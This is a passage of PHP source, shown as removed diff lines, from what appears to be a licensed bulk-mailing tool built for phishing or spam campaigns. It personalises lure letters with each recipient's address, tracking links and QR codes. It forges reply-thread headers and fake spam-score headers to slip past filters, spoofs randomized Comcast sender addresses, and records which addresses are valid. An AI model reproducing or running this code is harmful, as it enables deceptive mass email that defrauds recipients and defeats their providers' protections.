-        				$char7 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,7);
-        				$char6 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,6);
-        				$char5 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,5);
-        				$char4 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,4);
-        				$char3 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,3);
-        				$char2 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,2);
-        				$CHARs2 = substr(str_shuffle(strtoupper("ABCDEFGHIJKLMNOPQRSTUVWXYZ")),0,2);
-        				$num9 = substr(str_shuffle("0123456789"),0,9);
-        				$num4 = substr(str_shuffle("0123456789"),0,4);
-        				$key64 = base64_encode($email);
-        			
-        
-                                $letterFile = 'letter/' . $settings['letterFile']; // Update the path as needed
-                                $letter = file_get_contents($letterFile) or die("Letter not found!");
-                                $letter = str_ireplace("##char8##", $char8, $letter);
-                                $letter = str_ireplace("##char7##", $char7, $letter);
-                                $letter = str_ireplace("##char6##", $char6, $letter);
-                                $letter = str_ireplace("##char5##", $char5, $letter);
-                                $letter = str_ireplace("##char4##", $char4, $letter);
-                                $letter = str_ireplace("##char3##", $char3, $letter);
-                        
-                                // ... (continue with your existing code)
-                        
-                        // Additional randomization features
-                        
-				          if ($commonSettings['randomparam'] == true) {
-            		    		$letter = str_ireplace("##link##", $link[array_rand($link)].'?id='.generatestring('mix', 8, 'normal'), $letter);
-            					$letter = str_ireplace("##char8##", $char8, $letter);
-            					$letter = str_ireplace("##char7##", $char7, $letter);
-            					$letter = str_ireplace("##char6##", $char6, $letter);
-            					$letter = str_ireplace("##char5##", $char5, $letter);
-            					$letter = str_ireplace("##char4##", $char4, $letter);
-            					$letter = str_ireplace("##char3##", $char3, $letter);
-            		            	}else{
-            		    		$letter = str_ireplace("##link##", $link[array_rand($link)], $letter);
-            		    		$letter = str_ireplace("##char8##", $char8, $letter);
-            					$letter = str_ireplace("##char7##", $char7, $letter);
-            					$letter = str_ireplace("##char6##", $char6, $letter);
-            					$letter = str_ireplace("##char5##", $char5, $letter);
-            					$letter = str_ireplace("##char4##", $char4, $letter);
-            					$letter = str_ireplace("##char3##", $char3, $letter);
-            					
-            		    	}
-                		    	$letter = str_ireplace("##date##", date('D, F d, Y  g:i A') , $letter);
-                                $letter = str_ireplace("##date2##", date('D, F d, Y') , $letter);
-                                $letter = str_ireplace("##date3##", date('F d, Y  g:i A') , $letter);
-                                $letter = str_ireplace("##date4##", date('F d, Y') , $letter);
-                				$letter = str_ireplace("##date5##", date('F d') , $letter);
-                				$letter = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $letter);
-                				$letter = str_ireplace("##email##", $email , $letter);
-                				$letter = str_ireplace("##email64##", $key64 , $letter);
-                				$letter = str_ireplace("##link64##", $b64link, $letter);
-                				$letter = str_ireplace("##char9##", $char9, $letter);
-                       			$letter = str_ireplace("##char8##", $char8, $letter);
-                				$letter = str_ireplace("##char7##", $char7, $letter);
-                				$letter = str_ireplace("##char6##", $char6, $letter);
-                				$letter = str_ireplace("##char5##", $char5, $letter);
-                				$letter = str_ireplace("##char4##", $char4, $letter);
-                				$letter = str_ireplace("##char3##", $char3, $letter);
-                				$letter = str_ireplace("##char2##", $char2, $letter);
-                				$letter = str_ireplace("##CHARs2##", $CHARs2, $letter);
-                				$letter = str_ireplace("##num4##", $num4, $letter);
-                				$letter = str_ireplace("##userid##", $userId, $letter);
-                				$letter = str_ireplace("##domain##", $domains,  $letter);
-                				$letter = str_ireplace("##imglet##", $dataUri, $letter);
-                        	    $letter = str_ireplace("##qrcode##", '<div style="text-align: center;"><img src="data:image/png;base64,' . $qrCodeBase64 . '" ></div>', $letter);
-                        	    $letter = str_ireplace("##URLqrcode##", '<div style="text-align: center;"><a href="' . $link[array_rand($link)] . '" target="_blank"><img src="data:image/png;base64,' . $qrCodeBase64 . '"></a></div>', $letter);
-        
-                	
-
-
-                       // Replace placeholders in the subject with the current date
-                        
-                                $subject = str_ireplace("##date##", date('D, F d, Y  g:i A') , $subject);
-                                $subject = str_ireplace("##date2##", date('D, F d, Y') , $subject);
-                                $subject = str_ireplace("##date3##", date('F d, Y  g:i A') , $subject);
-                                $subject = str_ireplace("##date4##", date('F d, Y') , $subject);
-                				$subject = str_ireplace("##date5##", date('F d') , $subject);
-                				$subject = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $subject);
-                				$subject = str_ireplace("##email##", $email , $subject);
-                				$subject = str_ireplace("##email64##", $key64 , $subject);
-                				$subject = str_ireplace("##link64##", $b64link, $subject);
-                				$subject = str_ireplace("##char9##", $char9, $subject);
-                       			$subject = str_ireplace("##char8##", $char8, $subject);
-                				$subject = str_ireplace("##char7##", $char7, $subject);
-                				$subject = str_ireplace("##char6##", $char6, $subject);
-                				$subject = str_ireplace("##char5##", $char5, $subject);
-                				$subject = str_ireplace("##char4##", $char4, $subject);
-                				$subject = str_ireplace("##char3##", $char3, $subject);
-                				$subject = str_ireplace("##char2##", $char2, $subject);
-                				$subject = str_ireplace("##userid##", $userId, $subject);
-                				$subject = str_ireplace("##CHARs2##", $CHARs2, $subject);
-                				$subject = str_ireplace("##num4##", $num4, $subject);
-                				$subject = str_ireplace("##num9##", $num9, $subject);
-                				$subject = str_ireplace("##domain##", $domains,  $subject);
-                    
-                        // Set the subject
-                       
-                             // Check if the sender's email is valid
-                        
-			
-                               
-		       	        
-                                
-                                $fmail = str_ireplace("##domain##", $domains, $fmail);
-                                $fmail = str_ireplace("##userid##", $userId, $fmail);
-                                $fmail = str_ireplace("##relay##", $getsmtpUsername, $fmail);
-                                $fmail = str_ireplace("##date##", date('D, F d, Y  g:i A') , $fmail);
-                                $fmail = str_ireplace("##date2##", date('D, F d, Y') , $fmail);
-                                $fmail = str_ireplace("##date3##", date('F d, Y  g:i A') , $fmail);
-                                $fmail = str_ireplace("##date4##", date('F d, Y') , $fmail);
-                				$fmail = str_ireplace("##date5##", date('F d') , $fmail);
-                				$fmail = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $fmail);
-                				$fmail = str_ireplace("##email##", $email , $fmail);
-                				$fmail = str_ireplace("##email64##", $key64 , $fmail);
-                				$fmail = str_ireplace("##char9##", $char9, $fmail);
-                       			$fmail = str_ireplace("##char8##", $char8, $fmail);
-                				$fmail = str_ireplace("##char7##", $char7, $fmail);
-                				$fmail = str_ireplace("##char6##", $char6, $fmail);
-                				$fmail = str_ireplace("##char5##", $char5, $fmail);
-                				$fmail = str_ireplace("##char4##", $char4, $fmail);
-                				$fmail = str_ireplace("##char3##", $char3, $fmail);
-                				$fmail = str_ireplace("##char2##", $char2, $fmail);
-                				$fmail = str_ireplace("##CHARs2##", $CHARs2, $fmail);
-                				$fmail = str_ireplace("##num4##", $num4, $fmail);
-                				$fmail = str_ireplace("##num9##", $num9, $fmail);
-                                
-                                $fname = str_ireplace("##domain##", $domains, $fname); 
-                                $fname = str_ireplace("##userid##", $userId, $fname);
-                                $fname = str_ireplace("##date##", date('D, F d, Y  g:i A') , $fname);
-                                $fname = str_ireplace("##date2##", date('D, F d, Y') , $fname);
-                                $fname = str_ireplace("##date3##", date('F d, Y  g:i A') , $fname);
-                                $fname = str_ireplace("##date4##", date('F d, Y') , $fname);
-                				$fname = str_ireplace("##date5##", date('F d') , $fname);
-                				$fname = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $fname);
-                				$fname = str_ireplace("##email##", $email , $fname);
-                				$fname = str_ireplace("##email64##", $key64 , $fname);
-                				$fname = str_ireplace("##char9##", $char9, $fname);
-                       			$fname = str_ireplace("##char8##", $char8, $fname);
-                				$fname = str_ireplace("##char7##", $char7, $fname);
-                				$fname = str_ireplace("##char6##", $char6, $fname);
-                				$fname = str_ireplace("##char5##", $char5, $fname);
-                				$fname = str_ireplace("##char4##", $char4, $fname);
-                				$fname = str_ireplace("##char3##", $char3, $fname);
-                				$fname = str_ireplace("##char2##", $char2, $fname);
-                				$fname = str_ireplace("##CHARs2##", $CHARs2, $fname);
-                				$fname = str_ireplace("##num4##", $num4, $fname);
-                				$fname = str_ireplace("##num9##", $num9, $fname);
-                      
-                              	 
-
-            		    
-            		     if ($settings['encodeFromInfo']) {
-                           $mail->setFrom($fmail,  '=?UTF-8?B?' . base64_encode($fname) . '?=');
-                        } else {
-                        $mail->setFrom($fmail, $fname);
-                        
-                       }
-            		    
-            		    if ($settings['encodeSubject']) {
-                        
-                        $mail->Subject = '=?UTF-8?B?' . base64_encode($subject) . '?=';
-                        } else {
-                            $mail->Subject = $subject;
-                        }
-                        
-                  
-                      	if (!function_exists('generateRandomEmail')) {
-                                  function generateRandomEmail() {
-                                        $characters = 'abcdefghijklmnopqrstuvwxyz';
-                                        $randomString = '';
-                                        for ($i = 0; $i < 5; $i++) {
-                                            $randomString .= $characters[rand(0, strlen($characters) - 1)];
-                                        }
-                                        $randomString .= '@';
-                                        for ($i = 0; $i < 5; $i++) {
-                                            $randomString .= $characters[rand(0, strlen($characters) - 1)];
-                                        }
-                                        $randomString .= '.com';
-                                        return $randomString;
-                                    }
-                      	 }
-                      	 if (!function_exists('generateRandomNumber')) {
-                                 function generateRandomNumber() {
-                                                    return mt_rand(1000000000, 9999999999); // Random number between 100000 and 999999
-                                                }
-                                                
-                                    }            // Generate a random email
-                                                $randomEmail = generateRandomEmail();
-                                                
-                                                // Generate a random number
-                                                $randomNumber = generateRandomNumber();
-                                                
-                                                $randomIP = generateRandomIP();
-                      	 
-                                    
-
-
-
-                                 $fixedHeaders = [
-                                                    'Content-Type' => 'text/html; charset=utf-8',
-                                                    'Content-Transfer-Encoding' => 'quoted-printable',
-                                                    'Message-ID' => "<$randomNumber@example.com>",
-                                                    'Date' => 'Thu, 07 Dec 2023 02:26:12 GMT',
-                                                    'Priority' => 'normal',
-                                                    'Importance' => 'normal',
-                                                    'X-Priority' => '=?UTF-8?Q?=221_=28Highest=29=22?=',
-                                                    'X-Msmail-Priority' => '=?UTF-8?Q?=22High=22?=',
-                                                    'Reply-To' => $fmail,
-                                                    'In-Reply-To' => '<previous-message-id@smtp.comcast.net>',
-                                                    'References' => '<previous-message-id@smtp.comcast.net>',
-                                                    'X-Auto-Response-Suppress' => '=?UTF-8?Q?=22OOF=2C_DR=2C_RN=2C_NRN=2C_AutoReply?= =?UTF-8?Q?=22?=', 
-                                                    'X-Mailer' => '=?UTF-8?Q?=22Your_Custom_Mailer=22?=',
-                                                    'Return-Receipt-To' => $randomEmail,
-                                                    'Disposition-Notification-To' => $randomEmail,
-                                                    'X-Confirm-Reading-To' => $randomEmail,
-                                                    'X-Unsubscribe' => $randomEmail,
-                                                    'List-Unsubscribe' => $randomEmail,
-                                                    'X-Report-Abuse' => $randomEmail,
-                                                    'Precedence' => 'bulk',
-                                                    'X-Bulk' => 'bulk',
-                                                    'X-Spam-Status' => 'No, score=-2.7',
-                                                    'X-Spam-Score' => '-2.7',
-                                                    'X-Spam-Bar' => '/',
-                                                    'X-Spam-Flag' => 'NO',
-                                             //       'X-Originating-IP' => $randomIP,
-                                                    'To' => $email
-                                                ];
-                                                      
-                                                
-                                                            // Check if the customHeaders key exists and is an array
-                            if (isset($customHeaderSettings['customHeaders']) && is_array($customHeaderSettings['customHeaders'])) {
-                                // Retrieve the custom headers
-                                $customHeaders = $customHeaderSettings['customHeaders'];
-                            
-                                // Merge fixed headers with custom headers
-                                $allHeaders = array_merge($fixedHeaders, $customHeaders);
-                            
-                                // Loop through all merged headers
-                                foreach ($allHeaders as $header => $value) {
-                                    // Use $header and $value here as needed
-                                   
-                                    // For example, adding headers to PHPMailer
-                                    $mail->addCustomHeader("$header: $value");
-                                }
-                            } else {
-                                // If custom headers are not properly defined, use only the fixed headers
-                                $allHeaders = $fixedHeaders;
-                            
-                                // Loop through fixed headers
-                                foreach ($allHeaders as $header => $value) {
-                                    // Use $header and $value here as needed
-                                  
-                                    // For example, adding headers to PHPMailer
-                                    $mail->addCustomHeader("$header: $value");
-                                }
-                            }
-                        
-                        $mail->isHTML(true);
-                        
-                        $mail->Body = $letter; // Set the content of your email
-                    
-                                            
-                        if (!function_exists('handleFailure')) {
-                               function handleFailure($errorMessage, $email, $consecutiveFailures, $maxConsecutiveFailures, $failedEmailsFile, $badlistFile, $recipientList, $sentEmailsFile) {
-                        // Check if the error message contains "Could not connect to SMTP host"
-                        if (strpos($errorMessage, 'Could not connect to SMTP host') !== false) {
-                            // Increment the consecutive failures counter
-                            $consecutiveFailures++;
-                        }
-                    
-                        $errorMessage = strtolower($errorMessage);
-                        
-                        // Check if the error message contains specific phrases
-                        $specificErrorPhrases = ['could not connect', 'could not authenticate','too many emails'];
-                        
-                        $isSpecificError = false;
-                        
-                        foreach ($specificErrorPhrases as $phrase) {
-                            if (strpos($errorMessage, strtolower($phrase)) !== false) {
-                                $isSpecificError = true;
-                                break;
-                            }
-                        }
-                        
-                        // Log the email to the failedEmailsFile if it's a specific error, otherwise log it to the badlistFile
-                        if ($isSpecificError) {
-                            file_put_contents($failedEmailsFile, $email . PHP_EOL, FILE_APPEND);
-                        } else {
-                            file_put_contents($badlistFile, $email . PHP_EOL, FILE_APPEND);
-                        }
-
-                        // Print the email in red for failure
-                        echo "\033[0;31mFailed to send email to:\033[0m \033[0;31m$email Error: $errorMessage\033[0m\n";
-                    
-                        // Check if consecutive failures have reached the limit
-                        if ($consecutiveFailures >= $maxConsecutiveFailures) {
-                            echo "\033[0;37mToo many consecutive failures. Stopping further email sends.\033[0m\n";
-                    
-                          
-                            exit;
-                        }
-                    }
-                            
-                        }
-                    
-                    // Example usage within your main code with try-catch blocks
-                    
-                    try {
-                        if ($mail->send()) {
-                            // Reset the consecutive failures counter on successful email send
-                            $consecutiveFailures = 0;
-                    
-                            // Print the email in green for success
-                            echo "\n\033[0;33mEmail sent successfully to:\033[0m \033[0;32m$email\033[0m\n";
-                            file_put_contents($sentEmailsFile, $email . PHP_EOL, FILE_APPEND);
-                           if (!file_exists($validEmailsFile) || !strpos(file_get_contents($validEmailsFile), $email)) {
-                                file_put_contents($validEmailsFile, $email . PHP_EOL, FILE_APPEND);
-                            }
-                        } else {
-                            handleFailure($mail->ErrorInfo, $email, $consecutiveFailures, $maxConsecutiveFailures, $failedEmailsFile, $badlistFile, $recipientList, $sentEmailsFile);
-                        }
-                    } catch (Exception $e) {
-                        // Handle exceptions and increment the consecutive failures counter
-                        $consecutiveFailures++;
-                    
-                        handleFailure($e->getMessage(), $email, $consecutiveFailures, $maxConsecutiveFailures, $failedEmailsFile, $badlistFile, $recipientList, $sentEmailsFile);
-                    }
-                                            
-                                            
-                                            
-                        if (!empty($settings['sleepDuration']) && is_numeric($settings['sleepDuration'])) {
-                        // Retrieve sleep duration from settings
-                        $sleeptimer = $settings['sleepDuration'];
-                        echo "\nSleep For: \033[0;32m$sleeptimer seconds\033[0m\n";
-                        // Use usleep to sleep for the specified duration in microseconds
-                        sleep(intval($settings['sleepDuration']));
-                    
-                        // Output the sleep duration in green
-                        
-                    }
-                    
-
-                        // Clear recipients for the next iteration
-                        $mail->clearAddresses();
-                        $mail->clearCustomHeaders();
-                        
-                
-                    }
-                    
-         
-                    
-                   } else {
-    
-}
-               
-                    // Exit the child process
-                    exit();
-                         
-                }
-                
-
-                
-            }
-
-            // Wait for all child processes to finish
-            foreach ($pids as $pid) {
-                pcntl_waitpid($pid, $status);
-            }
-            
-            
-          
-            
-
-                    $recipientListFile = 'list/' . $settings['recipientListFile'];
-                    $failedEmailsFile = 'failed.txt';
-                    $sentEmailsFile = 'pass.txt';
-                    $badlistFile = 'bad.txt';
-                    
-                    function filterRecipientList($recipientListFile, $sentEmailsFile, $badlistFile)
-                    {
-                        $recipientList = file($recipientListFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-                        $sentEmails = [];
-                        $badlist = [];
-                    
-                        if (file_exists($sentEmailsFile)) {
-                            $sentEmails = file($sentEmailsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-                        }
-                    
-                        if (file_exists($badlistFile)) {
-                            $badlist = file($badlistFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-                        }
-                    
-                        $combinedEmails = array_merge($sentEmails ?: [], $badlist ?: []);
-                        $combinedEmails = array_unique($combinedEmails); // Remove duplicates
-                    
-                        $RecipientListForFilter = array_diff($recipientList, $combinedEmails);
-                    
-                        // Save the new filtered recipient list to "resend.txt"
-                        file_put_contents("resend.txt", implode(PHP_EOL, $RecipientListForFilter) . PHP_EOL);
-                    }
-                    
-                    // Call function to filter recipient list
-                    filterRecipientList($recipientListFile, $sentEmailsFile, $badlistFile);
-                    
-                    
-                    // Function to count unique lines in a file
-                    function countLines($file)
-                    {
-                        if (file_exists($file)) {
-                            $lines = file($file);
-                            if ($lines === false) {
-                                return 0; // Unable to read the file
-                            } else {
-                                return count($lines);
-                            }
-                        } else {
-                            return 0; // File doesn't exist
-                        }
-                    }
-                    
-                    $failedEmailsFile = 'failed.txt';
-                    $sentEmailsFile = 'pass.txt';
-                    $badlistFile = 'bad.txt';
-                    $recipientListFile = 'list/' . $settings['recipientListFile']; // Update the path as needed
-                    
-                    $failedEmailsCount = countLines($failedEmailsFile);
-                    $sentEmailsCount = countLines($sentEmailsFile);
-                    $badEmailsCount = countLines($badlistFile);
-                    $recipientListFileCount = countLines($recipientListFile);
-                    
-                    // Calculate the total processed emails
-                    $totalProcessedEmails = $failedEmailsCount + $sentEmailsCount + $badEmailsCount;
-                    
-                    echo "Original Email Count: $recipientListFileCount\n";
-                    echo "Total Processed Email Count: $totalProcessedEmails\n";
-                                    
-                    
-                    if ($totalProcessedEmails === $recipientListFileCount) {
-                        if (file_exists($sentEmailsFile)) {
-                            $sentEmails = array_unique(file($sentEmailsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
-                        } else {
-                            echo "No email was sent\n";
-                        }
-                    
-                        if (file_exists($badlistFile)) {
-                            $badEmails = array_unique(file($badlistFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
-                        } else {
-                            echo "No Bad emails\n";
-                        }
-                        if (file_exists($failedEmailsFile)) {
-                            $failedEmails = array_unique(file($failedEmailsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
-                        } else {
-                            echo "No Failed emails\n";
-                        }
-                    
-                        if (empty($failedEmails) && !empty($sentEmails)) {
-                            $sentCount = count($sentEmails);
-                            echo "\n\033[0;32mAll Emails Sent Successfully. Sent Count: $sentCount\033[0m\n";
-                        } elseif (!empty($failedEmails)) {
-                            $failedCount = count($failedEmails);
-                            echo "\n\033[0;33mNot all emails were sent. Check failed.txt file for details. Failed Count: $failedCount\033[0m\n";
-                        } elseif (empty($sentEmails)) {
-                            echo "\n\033[0;33mNo emails were sent.\033[0m\n";
-                        }
-                    } else {
-                        $unsentCount = $recipientListFileCount - $sentEmailsCount - $badEmailsCount;
-                        echo "\n\033[0;33mNot all emails have been sent due to errors. Unsent Count: $unsentCount\033[0m\n";
-                    }
-
-
-
-            
-            
-        }
-    } catch (Exception $e) {
-        echo "Error: {$e->getMessage()}\n";
-    }
-    
-} elseif ($userStatus === 'expired') {
-    echo "User account has expired. Contact S1L3NT_T0RTUG3R\n";
-} elseif ($userStatus === 'admin') {
-    echo "\033[1;33m\n\n\t\tWelcome Admin.\n\n";
-    
-    
-    
-    // Create a PHPMailer instance
-    $mail = new PHPMailer(true);
-
-    try {
-        
-            $resends = 'resend.txt';
-            $failedEmailsFile = 'failed.txt';
-            $badlistFile = 'bad.txt';
-            $sentEmailsFile = 'pass.txt';
-            $validEmailsFile = 'valid.txt';
-            
-            // Function to empty files if they exist
-            function emptyFileIfExists($file) {
-                if (file_exists($file)) {
-                    file_put_contents($file, ''); // Empty the file
-                    echo "File '$file' emptied successfully.\n";
-                } else {
-                   
-                }
-            }
-            
-            // Empty the files if they exist
-            emptyFileIfExists($resends);
-            emptyFileIfExists($failedEmailsFile);
-            emptyFileIfExists($badlistFile);
-            emptyFileIfExists($sentEmailsFile);
-
-
-
-        // Check if there are multiple SMTP configurations
-     if (count($smtpSettings) > 1) {
-		 
-		 echo "\033[1;33mProceeding to send emails...\n";
-         
-$loop = React\EventLoop\Factory::create();
-  
-$settings = array_merge($recipientListSettings, $commonSettings, $customHeaderSettings);
-$recipientListFile = 'list/' . $settings['recipientListFile'];  // Update the path as needed
-
-$recipientList = file($recipientListFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-
-if ($settings['removeDuplicates']) {
-    $recipientList = array_unique($recipientList);
-}
-
-if (empty($recipientList)) {
-    throw new Exception('You must provide at least one recipient email address.');
-}
-
-function sendEmail($recipient, $smtpConfig, $retryCount = 2) {
-    $mail = new PHPMailer(true);
-
-    $mail->isSMTP();
-    $mail->Host       = $smtpConfig['host'];
-    $mail->Port       = $smtpConfig['port'];
-    $mail->Username   = $smtpConfig['username'];
-    $mail->Password   = $smtpConfig['password'];
-    $mail->SMTPSecure = $smtpConfig['Auth'];
-    $mail->Hostname   = $smtpConfig['Hostname'];
-    $mail->SMTPAuth   = true;
-    $mail->SMTPKeepAlive = true;
-    $mail->Priority   = $smtpConfig['priority'];
-    $mail->Encoding = $smtpConfig['encoding'];
-    $mail->CharSet = $smtpConfig['charset'];
-    $mail->addAddress(trim($recipient));
-    
-    
-    
-                      $senderEmail = isset($settings['from']) ? $settings['from'] : '';
-                         if (!$senderEmail) {
-                         throw new Exception('Invalid sender email address.');
-                     }
-                       
-                        
-                        
-        		         $edomainn = explode('@', $email);
-                         $userId = $edomainn[0];
-                         $domains = $edomainn[1];
-                        
-                        
-                            $fmail = $settings['from'];
-                            $fname = $settings['fromname'];
-                            $subject = $settings['subject'];
-                    
-                          
-                        $getsmtpUsername = $smtpSettings[0]['username'];
-                         if ($settings['randSender'] == true) {
-                        $domainsmtp = "xfinity.comcast.net";
-                    	$mylength = rand(15,30);
-                    	$mail->Sender = substr(str_shuffle('0123456789abcdefghijklmnopqrstuvwxyz'),1,$mylength)."communication@".$domainsmtp;
-            //			
-                    } else {
-                       $mail->Sender = $fmail;
-                    }
-                        // Attachments
-                        
-                        
-                        
-                        if (!empty($settings['image_attachfile'])) {
-                            $imageAttachmentPath = 'attachment/' . $settings['image_attachfile']; // Update the path as needed
-                             if ($settings['displayimage'] == true) {
-                             $mail->addEmbeddedImage($imageAttachmentPath, 'imgslet', $settings['image_attachname'], 'base64', 'image/jpeg, image/jpg, image/png');
-                             }else{
-                                 $mail->addAttachment($imageAttachmentPath, $settings['image_attachfile']);
-                            }
-                            
-                        }
-                        
-                                        
-    
-
-                        if (!empty($settings['pdf_attachfile'])) {
-                            $mail->addAttachment($settings['pdf_attachfile']);
-                        }
-                         $link = explode('|', $commonSettings['link']);
-                        $b64link = base64_encode($commonSettings['linkb64']);
-                       
-                        
-                        
-                        if ($commonSettings['autolink'] == true) {
-            		    	$qrCode = new QrCode($commonSettings['qrlink'] . '?e=' . $email);
-                            $qrCode->setLabel($commonSettings['qrlabel']);
-                      	    
-		        	    }else{
-		    	    
-		    	            $qrCode = new QrCode($commonSettings['qrlink']);
-                            $qrCode->setLabel($commonSettings['qrlabel']);
-                        
-		            	}
-				    
-                             $qrCode->setSize(160); // Set the size of the QR code
-
-                                // Get QR code image data as base64
-                            $qrCodeBase64 = base64_encode($qrCode->writeString());
-                            $label = '<div style="text-align:center;font-size:16px;font-weight:bold;">Scan Me</div>';
-                            $qrCodeImage = '<img src="data:image/png;base64,' . $qrCodeBase64 . '" alt="Scan Me QR Code" style="display:block;margin:0 auto;">';
-            				
-				
-				
-                               
-                        
-                       $imageBase64 = ''; // Initialize $imageBase64 variable
-
-                        if (!empty($commonSettings['imageLetter'])) {
-                            $imagePath = 'attachment/' . $commonSettings['imageLetter'];
-                        
-                            if (file_exists($imagePath)) {
-                                $imageBase64 = base64_encode(file_get_contents($imagePath));
-                            } else {
-                                // Handle case when the file doesn't exist
-                                echo "The image file doesn't exist at $imagePath";
-                            }
-                        }
-                        
-                        // Use $imageBase64 as needed, ensuring it contains valid data
-                        $dataUri = !empty($imageBase64) ? 'data:image/png;base64,' . $imageBase64 : '';
-                        
-                                               
-                        $char9 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,9);
-        				$char8 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,8);
-        				$char7 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,7);
-        				$char6 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,6);
-        				$char5 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,5);
-        				$char4 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,4);
-        				$char3 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,3);
-        				$char2 = substr(str_shuffle("abcdefghijklmnopqrstuvwxyz0123456789"),0,2);
-        				$CHARs2 = substr(str_shuffle(strtoupper("ABCDEFGHIJKLMNOPQRSTUVWXYZ")),0,2);
-        				$num9 = substr(str_shuffle("0123456789"),0,9);
-        				$num4 = substr(str_shuffle("0123456789"),0,4);
-        				$key64 = base64_encode($email);
-        			
-        
-                                $letterFile = 'letter/' . $settings['letterFile']; // Update the path as needed
-                                $letter = file_get_contents($letterFile) or die("Letter not found!");
-                                $letter = str_ireplace("##char8##", $char8, $letter);
-                                $letter = str_ireplace("##char7##", $char7, $letter);
-                                $letter = str_ireplace("##char6##", $char6, $letter);
-                                $letter = str_ireplace("##char5##", $char5, $letter);
-                                $letter = str_ireplace("##char4##", $char4, $letter);
-                                $letter = str_ireplace("##char3##", $char3, $letter);
-                        
-                                // ... (continue with your existing code)
-                        
-                        // Additional randomization features
-                        
-				          if ($commonSettings['randomparam'] == true) {
-            		    		$letter = str_ireplace("##link##", $link[array_rand($link)].'?id='.generatestring('mix', 8, 'normal'), $letter);
-            					$letter = str_ireplace("##char8##", $char8, $letter);
-            					$letter = str_ireplace("##char7##", $char7, $letter);
-            					$letter = str_ireplace("##char6##", $char6, $letter);
-            					$letter = str_ireplace("##char5##", $char5, $letter);
-            					$letter = str_ireplace("##char4##", $char4, $letter);
-            					$letter = str_ireplace("##char3##", $char3, $letter);
-            		            	}else{
-            		    		$letter = str_ireplace("##link##", $link[array_rand($link)], $letter);
-            		    		$letter = str_ireplace("##char8##", $char8, $letter);
-            					$letter = str_ireplace("##char7##", $char7, $letter);
-            					$letter = str_ireplace("##char6##", $char6, $letter);
-            					$letter = str_ireplace("##char5##", $char5, $letter);
-            					$letter = str_ireplace("##char4##", $char4, $letter);
-            					$letter = str_ireplace("##char3##", $char3, $letter);
-            					
-            		    	}
-                		    	$letter = str_ireplace("##date##", date('D, F d, Y  g:i A') , $letter);
-                                $letter = str_ireplace("##date2##", date('D, F d, Y') , $letter);
-                                $letter = str_ireplace("##date3##", date('F d, Y  g:i A') , $letter);
-                                $letter = str_ireplace("##date4##", date('F d, Y') , $letter);
-                				$letter = str_ireplace("##date5##", date('F d') , $letter);
-                				$letter = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $letter);
-                				$letter = str_ireplace("##email##", $email , $letter);
-                				$letter = str_ireplace("##email64##", $key64 , $letter);
-                				$letter = str_ireplace("##link64##", $b64link, $letter);
-                				$letter = str_ireplace("##char9##", $char9, $letter);
-                       			$letter = str_ireplace("##char8##", $char8, $letter);
-                				$letter = str_ireplace("##char7##", $char7, $letter);
-                				$letter = str_ireplace("##char6##", $char6, $letter);
-                				$letter = str_ireplace("##char5##", $char5, $letter);
-                				$letter = str_ireplace("##char4##", $char4, $letter);
-                				$letter = str_ireplace("##char3##", $char3, $letter);
-                				$letter = str_ireplace("##char2##", $char2, $letter);
-                				$letter = str_ireplace("##CHARs2##", $CHARs2, $letter);
-                				$letter = str_ireplace("##num4##", $num4, $letter);
-                				$letter = str_ireplace("##userid##", $userId, $letter);
-                				$letter = str_ireplace("##domain##", $domains,  $letter);
-                				$letter = str_ireplace("##imglet##", $dataUri, $letter);
-                        	    $letter = str_ireplace("##qrcode##", '<div style="text-align: center;"><img src="data:image/png;base64,' . $qrCodeBase64 . '" ></div>', $letter);
-                        	    $letter = str_ireplace("##URLqrcode##", '<div style="text-align: center;"><a href="' . $link[array_rand($link)] . '" target="_blank"><img src="data:image/png;base64,' . $qrCodeBase64 . '"></a></div>', $letter);
-        
-                	
-
-
-                       // Replace placeholders in the subject with the current date
-                        
-                                $subject = str_ireplace("##date##", date('D, F d, Y  g:i A') , $subject);
-                                $subject = str_ireplace("##date2##", date('D, F d, Y') , $subject);
-                                $subject = str_ireplace("##date3##", date('F d, Y  g:i A') , $subject);
-                                $subject = str_ireplace("##date4##", date('F d, Y') , $subject);
-                				$subject = str_ireplace("##date5##", date('F d') , $subject);
-                				$subject = str_ireplace("##48hrs##", date('F j, Y', strtotime('+48 hours')) , $subject);
-                				$subject = str_ireplace("##email##", $email , $subject);
-                				$subject = str_ireplace("##email64##", $key64 , $subject);
-                				$subject = str_ireplace("##link64##", $b64link, $subject);
-                				$subject = str_ireplace("##char9##", $char9, $subject);
-                       			$subject = str_ireplace("##char8##", $char8, $subject);
-                				$subject = str_ireplace("##char7##", $char7, $subject);
-                				$subject = str_ireplace("##char6##", $char6, $subject);
-                				$subject = str_ireplace("##char5##", $char5, $subject);
-                				$subject = str_ireplace("##char4##", $char4, $subject);
-                				$subject = str_ireplace("##char3##", $char3, $subject);
-                				$subject = str_ireplace("##char2##", $char2, $subject);
